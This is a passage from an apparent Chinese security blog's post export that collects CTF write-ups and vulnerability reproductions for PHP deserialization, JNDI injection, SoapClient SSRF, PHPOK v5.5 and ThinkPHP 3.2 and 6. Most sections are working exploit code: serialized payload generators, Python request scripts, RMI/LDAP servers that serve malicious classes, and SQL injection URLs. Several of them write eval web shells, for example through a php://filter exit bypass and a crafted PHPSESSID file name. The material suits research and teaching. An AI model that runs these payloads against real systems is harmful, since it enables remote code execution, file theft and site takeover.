dbCtrl();$payload='&quot;;s:3:&quot;ccc&quot;;'.serialize($a).'}';//echo $pauload;$p=str_repeat('union',strlen($payload)).$payload;echo $p; 12345678import requestsurl=&quot;http://8f273265-29ea-44e2-afae-70823a82f76f.node3.buuoj.cn/update.php&quot;data={ &quot;age&quot;:'', &quot;nickname&quot;:'unionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunion&quot;;s:3:&quot;ccc&quot;;O:12:&quot;UpdateHelper&quot;:3:{s:2:&quot;id&quot;;N;s:7:&quot;newinfo&quot;;N;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:3:{s:2:&quot;id&quot;;N;s:3:&quot;age&quot;;s:45:&quot;select password,id from user where username=?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:3:{s:3:&quot;age&quot;;N;s:8:&quot;nickname&quot;;N;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:8:{s:8:&quot;hostname&quot;;s:9:&quot;127.0.0.1&quot;;s:6:&quot;dbuser&quot;;s:4:&quot;root&quot;;s:6:&quot;dbpass&quot;;s:4:&quot;root&quot;;s:8:&quot;database&quot;;s:4:&quot;test&quot;;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;N;s:6:&quot;mysqli&quot;;N;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;}}}}}'}r=requests.post(url=url,data=data)print(r.text) 解密登陆后拿到flag 参考： https://tiaonmmn.github.io/2020/03/04/BUUOJ%E5%88%B7%E9%A2%98-Web-GYCTF2020-Easyphp/ https://ctf.ieki.xyz/buuoj/gyctf-2020.html https://www.1ight.top/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB/","link":"/2021/03/27/GYCTF2020-Easyphp/"},{"title":"JNDI注入","text":"概念JNDIJava命名和目录接口（JNDI）是一种Java API，类似于一个索引中心，它允许客户端通过name发现和查找数据和对象。JNDI本质上是一个接口，在这个接口下可以实现多种目录系统服务，如RMI、LDAP等，可以通过名称查询相关对象 RMIRMI（Remote Method Invocation） 即Java远程方法调用，一种用于实现远程过程调用的应用程序编程接口，常见的两种接口实现为JRMP（Java Remote Message Protocol，Java远程消息交换协议）以及CORBA。 相当于跨越jvm，调用一个远程方法。RMI是一种行为，即Java远程方法调用 JRMPJava远程方法协议（英语：Java Remote Method Protocol，JRMP）是特定于Java技术的、用于查找和引用远程对象的协议。这是运行在Java远程方法调用（RMI）之下、TCP/IP之上的线路层协议（英语：Wire protocol）。 本质上是一个协议，用于Java RMI过程，功能上相当于web访问中的http协议，只有通过使用该协议才能实现RMI远程方法调用 LDAPLDAP（Lightweight Directory Access Protocol）-轻量目录访问协议。本质上相当于一个数据库， JNDI注入原理JNDI支持多种服务类型，当服务类型为RMI协议时，如果从RMI注册服务中lookup的对象类型为Reference类型或其子类时会导致远程代码执行。 因为Reference类提供了两个重要属性： 123451.className远程调用引用的类名2.codebase url决定在进行rmi远程调用时对象的位置，codebase url支持http协议，当通过lookup寻找的远程调用类在RMI服务器的CLASSPATH不存在时就会从指定的codebase url进行类的加载，如果两者都没有，远程调用失败 JNDI RCE漏洞产生原因 1在lookup的时候，会从RMI注册中心下载数据，由于服务名称和对象或命名引用相关联，只要在Registrations注册中心注册一个命名引用，即Reference，它具有三个参数，className、factory、classFactoryLocation。ookup它并下载到本地后，会使用Reference的classFactoryLocation指定的地址去下载className指定class文件，接着加载并实例化，这样就会远程调用类的构造方法，如果把恶意代码放在远程调用类的构造方法中，就可以触发RCE。 JNDI+RMI适用版本：小于JDK 6u132, JDK 7u122, JDK 8u113（原因是Java提升了JNDI 限制了Naming/Directory服务中JNDI Reference远程加载Object Factory类的特性。系统属性 com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase 的默认值变为false，即默认不允许从远程的Codebase加载Reference工厂类。） 测试jdk版本 8u101 CIENT.java 123456789101112131415package jndi;import javax.naming.Context;import javax.naming.InitialContext;public class Client { public static void main(String[] args) throws Exception { String uri = &quot;rmi://127.0.0.1:1099/aa&quot;; Context ctx = new InitialContext(); ctx.lookup(uri); }} SERVER.java 123456789101112131415161718package jndi;import com.sun.jndi.rmi.registry.ReferenceWrapper;import javax.naming.Reference;import java.rmi.registry.Registry;import java.rmi.registry.LocateRegistry;public class SERVER { public static void main(String[] args) throws Exception { Registry registry = LocateRegistry.createRegistry(1099); Reference aa = new Reference(&quot;ExecTest&quot;, &quot;ExecTest&quot;, &quot;http://127.0.0.1:8081/&quot;); ReferenceWrapper refObjWrapper = new ReferenceWrapper(aa); System.out.println(&quot;Binding 'refObjWrapper' to 'rmi://127.0.0.1:1099/aa'&quot;); registry.bind(&quot;aa&quot;, refObjWrapper); }} ExecTest.java 1234567891011121314151617181920212223242526272829303132333435363738394041424344import java.io.BufferedReader;import java.io.IOException;import java.io.InputStream;import java.io.InputStreamReader;import java.io.Reader;import javax.print.attribute.standard.PrinterMessageFromOperator;public class ExecTest { public ExecTest() throws IOException,InterruptedException{ String cmd=&quot;calc&quot;; final Process process = Runtime.getRuntime().exec(cmd); printMessage(process.getInputStream());; printMessage(process.getErrorStream()); int value=process.waitFor(); System.out.println(value); } private static void printMessage(final InputStream input) { // TODO Auto-generated method stub new Thread (new Runnable() { @Override public void run() { // TODO Auto-generated method stub Reader reader =new InputStreamReader(input); BufferedReader bf = new BufferedReader(reader); String line = null; try { while ((line=bf.readLine())!=null) { System.out.println(line); } }catch (IOException e){ e.printStackTrace(); } } }).start(); } public static void main(String[] args) { }} 把编译好的ExecTest.class文件放到web目录下 启用web服务 1py -3 -m http.server 8081 在IDEA里执行SERVER和CLIENT，成功弹出计算器 JNDI+LDAP除了RMI服务外，JNDI还可以对接LDAP服务，只需要把lookup的地址改成ldap://即可，同样可以从攻击者控制的LDAP服务端返回一个恶意的JNDI Reference对象。 适用版本 小于JDK 11.0.1、8u191、7u201、6u211（之后com.sun.jndi.ldap.object.trustURLCodebase属性值被调整为false） 这里使用工具来搭建ldap服务端 https://github.com/mbechler/marshalsec 安装过程 https://www.cnblogs.com/cute-puli/p/14373826.html https://blog.csdn.net/qq_43968080/article/details/105586109 1java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8081/#ExecTest 跟之前一样开启http服务并把恶意类class文件复制到目录下 CLIENT.java 123456789101112package jndi;import javax.naming.InitialContext;public class Client { public static void main(String[] args) throws Exception { Object object=new InitialContext().lookup(&quot;ldap://192.168.111.129:1389/ExecTest&quot;); }} 执行成功 绕过高版本限制版本大于JDK 11.0.1、8u191、7u201、6u211时，之前这些利用方式都已经失效。但是仍然可以绕过 两种绕过方法： 1231.找到一个受害者本地CLASSPATH中的类作为恶意的Reference Factory工厂类，并利用这个本地的Factory类执行命令。2.利用LDAP直接返回一个恶意的序列化对象，JNDI注入依然会对该对象进行反序列化操作，利用反序列化Gadget完成命令执行。 主要依靠受害者本地CLASSPATH中的类，需要利用受害者本地的Gadget进行攻击。 参考： https://www.smi1e.top/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E4%B9%8Bjndi%E6%B3%A8%E5%85%A5/ https://xz.aliyun.com/t/6633 https://www.anquanke.com/post/id/221917#h3-2","link":"/2021/04/17/JNDI%E6%B3%A8%E5%85%A5/"},{"title":"MRCTF2020-EzpopRevenge","text":"一道挺有意思的ssrf+crlf+反序列化题 下载www.zip /flag.php 看到$_SERVER['REMOTE_ADDR']===&quot;127.0.0.1&quot;)就知道和ssrf有关。满足条件后，flag会被保存到$_SESSION['flag']中 反序列化点/usr/plugins/HelloWorld/Plugin/Plugin.php 反序列化点，对序列化字符串进行了过滤。并且当存在$_REQUEST['admin']时，显示$_SESSION 1C0incid3nc3 /var/Typecho/Plugin.php 反序列化SoapClient类反序列化SoapClient类并调用__call方法可以触发ssrf /var/Typecho/Plugin.php 在HelloWorld_DB类的__wakeup方法中实例化了一个Typecho_Db类 /var/Typecho/Db.php#Typecho_Db Typecho_Db类的构造方法，可以看到提示__toString()，传入参数$adapterName被当作字符串拼接，接下来需要找到符合条件的类。 12存在__toString()__toString中存在可以触发SoapClient::__call的语句 /var/Typecho/Db/Query.php#Typecho_Db_Query Typecho_Db_Query类符合要求。首先满足条件 1$this-&gt;_sqlPreBuild['action']='SELECT' 然后让$this-&gt;_adapter等于SoapClient类，接着调用不存在的方法parseSelect触发__call请求flag.php 构造exp由于SoapClient类无法传入Cookie参数，所以这里在user_agent这里加入换行符（\\r\\n）来构造出cookie参数。 123456789101112131415161718192021222324252627282930313233&lt;?phpclass HelloWorld_DB{ private $coincidence; public function __construct() { $this-&gt;coincidence=['hello'=&gt;new Typecho_Db_Query()]; }}class Typecho_Db_Query{ private $_sqlPreBuild; private $_adapter; public function __construct() { $this-&gt;_sqlPreBuild['action']='SELECT'; $headers = array( &quot;Cookie: PHPSESSID=5j1i9n0jol3vdbpg4m3svbp3n7&quot; ); $this-&gt;_adapter=new SoapClient(null, array( 'location' =&gt; &quot;http://127.0.0.1/flag.php&quot;, 'uri'=&gt; &quot;123&quot;, 'user_agent'=&gt;str_replace(&quot;^^&quot;,&quot;\\r\\n&quot;,'saaaaaa^^'.join('^^',$headers)))); }}$a=serialize(new HelloWorld_DB());echo base64_encode($a); 拿到flag","link":"/2021/05/14/MRCTF2020-EzpopRevenge/"},{"title":"PHPOK v5.5 csrf+反序列化漏洞getshell分析","text":"漏洞影响版本PHPOK v5.5 漏洞分析路由规则phpokcms代码结构，关键代码都在framework文件夹下 phpokcms的路由规则比较简单，index.php admin.php api.php 分别对应 framework文件夹下的www admin api这三个文件夹 请求url 1http://localhost/phpok/admin.php?c=address&amp;f=open 参数c的值拼接上_control.php就是对应的文件，对应的类即参数c的值拼接上_control，如address_control 参数f的值拼接上_f就是对应的方法,如open_f ](https://imgbed.cn/preview?id=60208e205dc5370001a461a4) 可利用恶意类文件位置：/framework/engine/cache.php __destruct()调用了save方法，在save方法中使用了file_put_contents函数，函数的第一个和第二个参数均可控，但是第二个参数前面拼接了&lt;?php exit();?&gt;使后面的php代码无法执行 123456789101112131415161718192021222324252627&lt;?phpclass cache{ public function __destruct() { $this-&gt;save($this-&gt;key_id,$this-&gt;key_list);//调用save $this-&gt;expired(); } public function save($id,$content='') { if(!$id || $content === '' || !$this-&gt;status){ return false; } $this-&gt;_time(); $content = serialize($content); $file = $this-&gt;folder.$id.&quot;.php&quot;; file_put_contents($file,'&lt;?php exit();?&gt;'.$content); $this-&gt;_time(); $this-&gt;_count(); if($GLOBALS['app']-&gt;db){ $this-&gt;key_list($id,$GLOBALS['app']-&gt;db-&gt;cache_index($id)); } return true; }}?&gt; 绕过exit()save方法中使用了file_put_contents函数，第一个和第二个参数均可控，第二个参数前面拼接了&lt;?php exit();?&gt;使后面的php代码无法执行，可以通过php://filter伪协议使拼接的&lt;?php exit();?&gt;失效 来源于 基于php://filter协议对exit函数几种逃逸方法的分析 1.string.strip_tags该特性从PHP 7.3.0起废弃 &lt;?php exit()?&gt;本质是XML标签，可以使用strip_tags()函数去除它。为了防止我们写入的代码也被去除，需要把代码base64编码后写入 1234//1.php&lt;?phpfile_put_contents('php://filter/write=string.strip_tags|convert.base64-decode/resource=shell.php','&lt;?php exit();?&gt;'.$_GET['a']);?&gt; 将&lt;?php phpinfo();进行base64编码后提交 1http://localhost/test/1.php?a=PD9waHAgcGhwaW5mbygpOw== 写入成功 2.base64base64编码结果只包含64个可打印字符，而PHP在解码base64时，遇到不在其中的字符时(如&lt;、&gt;、?、;、(、)等)，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码，如&lt;?php exit();?&gt;就会先变成phpexit再进行解码，phpexit一共7个字符，而base64解码算法是4个byte一组，所以再在后面任意添加一位，比如a，这样就是phpexita再在后面接上一句话的base64编码，前面八位phpexita解码结果是乱码不会被执行，后面接着解码一句话的base64编码 1234//1.php&lt;?phpfile_put_contents('php://filter/write=convert.base64-decode/resource=shell.php','&lt;?php exit();?&gt;'.$_GET['a']);?&gt; 提交 1http://localhost/test/1.php?a=aPD9waHAgcGhwaW5mbygpOw== 3.rot13&lt;?php exit(); ?&gt;在经过rot13编码后会变成&lt;?cuc rkvg(); ?&gt;，在php不开启short_open_tag时，php不认识这个字符串，也就不会被执行，&lt;?php phpinfo();?&gt;经过rot13编码后的结果为&lt;?cuc cucvasb();?&gt; 提交 1http://localhost/test/1.php?a=&lt;?cuc cucvasb();?&gt; 反序列化由名称得知decode()为解密函数，encode()为加密函数，encode()调用serialize()，decode()中调用unserialize()，找到调用decode()处，把序列化后的恶意类用encode()加密再使用decode()解密并进行反序列化。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768class token_lib{ private $keyid = ''; private $keyc_length = 6; private $keya; private $keyb; private $time; private $expiry = 3600; public function keyid($keyid='') { if(!$keyid){ return $this-&gt;keyid; } $this-&gt;keyid = strtolower(md5($keyid)); $this-&gt;config(); return $this-&gt;keyid; } private function config() { if(!$this-&gt;keyid){ return false; } $this-&gt;keya = md5(substr($this-&gt;keyid, 0, 16)); $this-&gt;keyb = md5(substr($this-&gt;keyid, 16, 16)); } public function encode($string) { if(!$this-&gt;keyid){ return false; } $string = serialize($string);//序列化 $expiry_time = $this-&gt;expiry ? $this-&gt;expiry : 365*24*3600; $string = sprintf('%010d',($expiry_time + $this-&gt;time)).substr(md5($string.$this-&gt;keyb), 0, 16).$string; $keyc = substr(md5(microtime().rand(1000,9999)), -$this-&gt;keyc_length); $cryptkey = $this-&gt;keya.md5($this-&gt;keya.$keyc); $rs = $this-&gt;core($string,$cryptkey); return $keyc.str_replace('=', '', base64_encode($rs)); //return $keyc.base64_encode($rs); } public function decode($string) { if(!$this-&gt;keyid){ return false; } $string = str_replace(' ','+',$string); $keyc = substr($string, 0, $this-&gt;keyc_length); $string = base64_decode(substr($string, $this-&gt;keyc_length)); $cryptkey = $this-&gt;keya.md5($this-&gt;keya.$keyc); $rs = $this-&gt;core($string,$cryptkey); $chkb = substr(md5(substr($rs,26).$this-&gt;keyb),0,16); if((substr($rs, 0, 10) - $this-&gt;time &gt; 0) &amp;&amp; substr($rs, 10, 16) == $chkb){ $info = substr($rs, 26); return unserialize($info);//反序列化 } return false; } } encode()和decode()都要求keyid，全局搜索得到keyid来源于管理员设置的api_code 1$this-&gt;lib('token')-&gt;keyid($this-&gt;site['api_code']); CSRF在后台找到API验证串设置处 抓包后发现无csrf防护，构造请求诱导管理员访问即可 利用构造脚本 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889&lt;?phpclass cache{ protected $key_id; protected $key_list; protected $folder; public function __construct(){ $this-&gt;key_id = 'shell'; $this-&gt;key_list = 'aa'.base64_encode('&lt;?php eval($_GET[&quot;shell&quot;]);?&gt;'); $this-&gt;folder = 'php://filter/write=convert.base64-decode/resource='; }}class token{ private $keyid = ''; private $keyc_length = 6; private $keya; private $keyb; private $time; private $expiry = 3600; public function keyid($keyid=''){ if(!$keyid){ return $this-&gt;keyid; } $this-&gt;keyid = strtolower(md5($keyid)); $this-&gt;config(); return $this-&gt;keyid; } private function config(){ if(!$this-&gt;keyid){ return false; } $this-&gt;keya = md5(substr($this-&gt;keyid, 0, 16)); $this-&gt;keyb = md5(substr($this-&gt;keyid, 16, 16)); } public function encode($string){ if(!$this-&gt;keyid){ return false; } $expiry_time = $this-&gt;expiry ? $this-&gt;expiry : 365*24*3600; $string = sprintf('%010d',($expiry_time + time())).substr(md5($string.$this-&gt;keyb), 0, 16).$string; $keyc = substr(md5(microtime().rand(1000,9999)), -$this-&gt;keyc_length); $cryptkey = $this-&gt;keya.md5($this-&gt;keya.$keyc); $rs = $this-&gt;core($string,$cryptkey); return $keyc.str_replace('=', '', base64_encode($rs)); //return $keyc.base64_encode($rs); } private function core($string,$cryptkey){ $key_length = strlen($cryptkey); $string_length = strlen($string); $result = ''; $box = range(0, 255); $rndkey = array(); // 产生密匙簿 for($i = 0; $i &lt;= 255; $i++){ $rndkey[$i] = ord($cryptkey[$i % $key_length]); } // 用固定的算法，打乱密匙簿，增加随机性，好像很复杂，实际上并不会增加密文的强度 for($j = $i = 0; $i &lt; 256; $i++){ $j = ($j + $box[$i] + $rndkey[$i]) % 256; $tmp = $box[$i]; $box[$i] = $box[$j]; $box[$j] = $tmp; } // 核心加解密部分 for($a = $j = $i = 0; $i &lt; $string_length; $i++){ $a = ($a + 1) % 256; $j = ($j + $box[$a]) % 256; $tmp = $box[$a]; $box[$a] = $box[$j]; $box[$j] = $tmp; $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256])); } return $result; }}$token = new token();$token-&gt;keyid('123456');echo $token-&gt;encode(serialize(new cache));?&gt; 运行脚本得到payload ](https://imgbed.cn/preview?id=60208e5954a29f0001d1ddfb) 在index_cotrol.php中的phpok_f方法中发现调用decode 根据路由规则请求url,token为payload 1http://localhost/phpok/api.php?c=index&amp;f=phpok&amp;token=478ef7obit5nzTBxeDcrCXjGxB4ifLSKWvkWtVrpSmI9W4o0rjCDuphi5+PHD0vNqavv0lx0PQ+v/RfRV/CPv81ncmZb2RJy2eYWxxRII1wSLQ825xh7jrjXMPjbAZ6gUiAuCb2HSMz/vizU53Wfc64OIB/5FYAH0OcBENNyngihF9LNgQ5pxVQkf2EAvG0T7AbWMb6prp0ZTaZ19SbZdAeKV3AB8LApao8nODRRNLutAwh5k6MUefwjD9lU/Czv0n/UXAGlIl+asWwzpz6pMYfHTbIc5Byug4 利用成功 参考： https://xz.aliyun.com/t/7852 https://www.ghtwf01.cn/index.php/archives/985/ https://www.ghtwf01.cn/index.php/archives/981/ http://althims.com/2020/02/05/phpok-5-4-173/","link":"/2021/02/08/PHPOK-v5-5-csrf-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Egetshell%E5%88%86%E6%9E%90/"},{"title":"ThinkPHP v3.2.* （SQL注入&amp;文件读取）反序列化复现","text":"参考 https://mp.weixin.qq.com/s?__biz=MzU2NDc2NDYwMA==&amp;mid=2247484711&amp;idx=1&amp;sn=0dd0f72b376b4922e4ae5b8bd614ae89&amp;scene=21#wechat_redirect 搭建环境框架会自动生成一个默认控制器，在默认控制器下添加一个测试用的Action即可。 分析1./ThinkPHP/Library/Think/Image/Driver/Imagick.class.php $this-&gt;img可控，寻找由destory方法的类 2./ThinkPHP/Library/Think/Session/Driver/Memcache.class.php destroy()方法中调用delete()方法 ，$this-&gt;handle属性可控，可传入任意类并调用它的delete()方法。destroy()方法需要传入一个$sessID，但是前面调用destroy()没有传值，而$this-&gt;sessionName可控，这样整个传入的参数都可控 3./ThinkPHP/Library/Think/Model.class.php $options数组为传入参数，可控，其他属性也可控，这样在两个if语句中出现的四个条件都可以满足，就可以第二次调用delete()方法也就是自身，而这次的参数变成了$this-&gt;data[$pk]，完全可控。而且通过下面这条语句可以调用任意类的delete()方法。 1$this-&gt;db-&gt;delete($options); 4./ThinkPHP/Library/Think/Db/Driver.class.php $options数组为传入参数，可控。因此$table可控，$table被拼接到$sql，再被传入$this-&gt;execute() 12$table=$this-&gt;parseTable($options['table']);$sql='DELETE FROM '.$table; 最终执行$this-&gt;execute($sql,!empty($options[‘fetch_sql’]) ? true : false); execute()方法中调用initConnect()方法初始化数据库 在initConnect()方法中，可以通过修改属性，满足条件empty($this-&gt;config[‘deploy’])，调用connect()。 这里新建了一个PDO对象，使用$this-&gt;config里的配置去创建数据库连接，然后去执行前面拼接的DELETESQL语句。 利用exp 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364&lt;?phpnamespace Think\\Db\\Driver{ use PDO; class Mysql{ protected $options = array( PDO::MYSQL_ATTR_LOCAL_INFILE =&gt; true // 开启才能读取文件 ); protected $config = array( &quot;debug&quot; =&gt; 1, &quot;database&quot; =&gt; &quot;thinkphp3&quot;, &quot;hostname&quot; =&gt; &quot;192.168.111.129&quot;, &quot;hostport&quot; =&gt; &quot;3306&quot;, &quot;charset&quot; =&gt; &quot;utf8&quot;, &quot;username&quot; =&gt; &quot;root&quot;, &quot;password&quot; =&gt; &quot;&quot; ); }}namespace Think\\Image\\Driver{ use Think\\Session\\Driver\\Memcache; class Imagick{ private $img; public function __construct(){ $this-&gt;img = new Memcache(); } }}namespace Think\\Session\\Driver{ use Think\\Model; class Memcache{ protected $handle; public function __construct(){ $this-&gt;handle = new Model(); } }}namespace Think{ use Think\\Db\\Driver\\Mysql; class Model{ protected $options = array(); protected $pk; protected $data = array(); protected $db = null; public function __construct(){ $this-&gt;db = new Mysql(); $this-&gt;options['where'] = ''; $this-&gt;pk = 'id'; $this-&gt;data[$this-&gt;pk] = array( &quot;table&quot; =&gt; &quot;mysql.user where 1=updatexml(1,user(),1)#&quot;, &quot;where&quot; =&gt; &quot;1=1&quot; ); } }}namespace { echo base64_encode(serialize(new Think\\Image\\Driver\\Imagick()));} 利用LOAD DATA INFILE读取文件，由于mysql客户端绝对信任服务端。导致攻击机可以构造一个恶意服务端，在连接的时候发送读取文件的请求，然后返回的结果会被记录到mysql.log 搭建mysql服务端-&gt;客户端连接-&gt;发送读取文件请求-&gt;在mysql.log中读取文件的内容 https://github.com/allyshka/Rogue-MySql-Server/ 修改为要读取的文件 运行 触发反序列化，连接恶意服务端 在mysql.log中查看读取到的文件","link":"/2021/04/04/ThinkPHP-v3-2-%EF%BC%88SQL%E6%B3%A8%E5%85%A5-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%EF%BC%89%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/"},{"title":"ThinkPhp3.2.3注入漏洞总结","text":"环境配置数据库连接配置 thinkphp3.2.3 where注入控制器 /Application/Home/Controller/IndexController.class.php payload 1http://localhost/tp3/?id[where]=1%20and%201=updatexml(1,concat(0x7e,(select database()),0x7e),1)# 分析在I()方法上打一个断点，I()方法用来获取GET和POST参数 在I()方法中经过htmlspecialchars()处理，再经过functions.php中think_filter函数过滤，这两处过滤对payload没有影响，可以直接忽略 think_filter函数 /ThinkPHP/Library/Think/Model.class.php 接下来进入find()方法处理 参数经过Model.class.php中的_parseOptions()方法处理后带入select方法进行查询，可以看到注入语句在经过_parseOptions()后就变成了int类型，后面的语句被去除了。 _parseOptions执行前，注入语句没有发生变化 跟进·_parseOptions()，满足条件进入_parseType() 在经过_parseType处理后，注入语句被转换成了int型，只保留了前面的数字,注意这里的$options['where']是一个array 跟进_parseType()，发现这里进行了强制类型转换，把payload强制转换成了int型，去掉了后面部分 绕过只要is_array($options['where'])这个条件不满足，就不会进入到强制转换函数中，payload也就不会被过滤，所以要想办法让$options['where']不为数组 1if(isset($options['where']) &amp;&amp; is_array($options['where']) &amp;&amp; !empty($fields) &amp;&amp; !isset($options['join'])) 当我们传入的payload为 1?id=45789 and 1=updatexml(1,concat(0x7e,(select database()),0x7e),1)# _parseOptions执行前，$options['where']就是一个数组了 find()函数开始存在一个判断，如果传入的参数为数字或者字符串，就会把他转换成数组再赋值给$options['where']，这样就会满足条件is_array($options['where'])从而导致payload被转换。 这里传入find()的参数是45789 and 1=updatexml(1,concat(0x7e,(select database()),0x7e),1)#，满足了if判断中的条件，注入失败。 当payload为 1?id[where]=45789 and 1=updatexml(1,concat(0x7e,(select database()),0x7e),1)# if条件不满足 options['where']就会是一个字符串，is_array($options['where'])条件不满足，就成功绕过了 注入语句没有被转换，直接被带入执行。 总结注入产生的原因是构造的poc绕过了thinkphp对$option['where']是否是一个数组的判断，从而不满足is_array($options['where'])，绕过了_parseType函数过滤，从而导致了注入。 Thinkphp 3.2.3 exp注入控制器 payload 1http://localhost/tp3/?username[0]=exp&amp;username[1]==1%20and%20updatexml(1,concat(0x7e,user(),0x7e),1) find()执行到 1$resultSet=$this-&gt;db-&gt;select($options); /ThinkPHP/Library/Think/Db/Driver.class.php 进入select() 进入buildSelectSql() 进入parsesql()，关注parseWhere()函数 parseWhere()函数调用parseWhereItem() elseif语句中直接拼接了where条件到sql语句中，到达该语句需要满足两个条件 12if(is_array($val)) { if(is_string($val[0])) 由于$exp=strtolower($val[0]);，传入username[0]=exp&amp;username[1]=1 and 1=1 注意控制器那里不能使用I()方法来获取参数，因为前面提到I()方法中调用了think_filter()函数，该函数会过滤exp，导致注入失败 thinkphp 3.2.3 bind注入控制器 12345678public function index(){ $User = M(&quot;Users&quot;); $user['id'] = I('id'); $data['password'] = I('password'); $valu = $User-&gt;where($user)-&gt;save($data); var_dump($valu);} payload 1http://localhost/tp3/?id[0]=bind&amp;id[1]=0 and updatexml(1,concat(0x7e,user(),0x7e),1)&amp;password=1 这里需要注意id[1]=0原理在下面说 save()函数中添加断点 /ThinkPHP/Library/Think/Db/Driver.class.php 进入update() 又经过了parseWhere()函数，除了之前利用的exp还有bind可以利用 直接传递payload，发现添加了冒号，注入失败 1http://localhost/tp3/?id[0]=bind&amp;id[1]=1 可以看到bindParam()添加冒号 ThinkPHP/Library/Think/Db/Driver.class.php execute()将:0替换为传入参数，让参数等于0，相当于:0，然后被替换为1，成功注入 1234if(!empty($this-&gt;bind)){ $that = $this; $this-&gt;queryStr = strtr($this-&gt;queryStr,array_map(function($val) use($that){ return '\\''.$that-&gt;escapeString($val).'\\''; },$this-&gt;bind)); } 参考https://www.cnblogs.com/-qing-/p/11444871.html https://darkless.cn/2020/06/07/thinkphp3.2.3-sqli/ https://syst1m.com/post/summary-of-thinkphp3-vulnerability/ https://www.chabug.org/audit/1062.html","link":"/2021/04/20/ThinkPhp3-2-3%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"},{"title":"Thinkphp6.0.0-6.0.1 任意文件操作漏洞复现","text":"环境配置thinkphp6默认是没有开启session功能的,需要取消app\\middleware.php文件中对session的注释 由于默认情况下没有创建session，所需要修改一下控制器，加上创建session的功能。 漏洞利用修改cookie为PHPSESSID=aaaabbbbccccddddeeeeffff1234.php，文件名长度必须等于32位 写入成功 1http://localhost/tp6.0.0/runtime/session/sess_aaaabbbbccccddddeeeeffff1234.php 写入文件内容 漏洞分析任意文件写入vendor/topthink/framework/src/think/session/Store.php 调用了write()方法，$sessionId等于$this-&gt;id vendor/topthink/framework/src/think/session/driver/File.php 跟进write()方法，写入文件名为经过getFileName()处理的$sessID，写入文件内容为传入的参数$sessData 跟进getFileName()，文件名实质上就等于sess_拼接上$this-&gt;id writeFile()方法调用了file_put_contents()写入文件，写入的文件名等于sess_拼接上$this-&gt;id 接着查找$this-&gt;id的来源，当传入的参数$id长度等于32位时返回$this-&gt;id等于$id。 vendor/topthink/framework/src/think/middleware/SessionInit.php 这里调用了setId()方法，$cookName等于PHPSESID， $this-&gt;$id 最终来源于cookie中的 PHPSESSID 。这样写入的文件名就可控了。文件内容data来源于session的内容，需要代码中存在可以控制session内容的操作，如Session::set('name',$_POST['c']);，就可以写入shell。 vendor/topthink/framework/src/think/session/Store.php 任意文件删除vendor/topthink/framework/src/think/session/Store.php 要触发delete()方法必须要使$this-&gt;data为空，即session中的变量键值为空 vendor/topthink/framework/src/think/session/driver/File.php delete()方法中的文件名拼接上了sess_，文件名不完全可控，在windows下才可以用一个不存在的目录绕过限制删除任意文件。 [GYCTF2020]EasyThinking通过错误信息得到thinkphp版本为6.0.0 存在www.zip \\app\\middleware.php session开启 \\app\\home\\controller\\Member.php 在search控制器下出现了创建session操作，session键值key通过post传参，内容可控 注册一个用户 登陆，修改修改PHPSESSID为aaaabbbbccccddddeeeeffff1234.php 写入shell，key=&lt;?php eval($_POST[1]);?&gt; 成功写入 1http://70366b0f-3c41-4ddb-8e92-2f4fae6b1b2e.node3.buuoj.cn/runtime/session/sess_aaaabbbbccccddddeeeeffff1234.php 蚁剑连接后发现flag为空，根目录存在readflag文件，需要执行readflag 发现disable_function过滤命令执行函数 使用蚁剑绕过disable_function插件读取flag 参考 http://hed9eh0g.top/?p=280 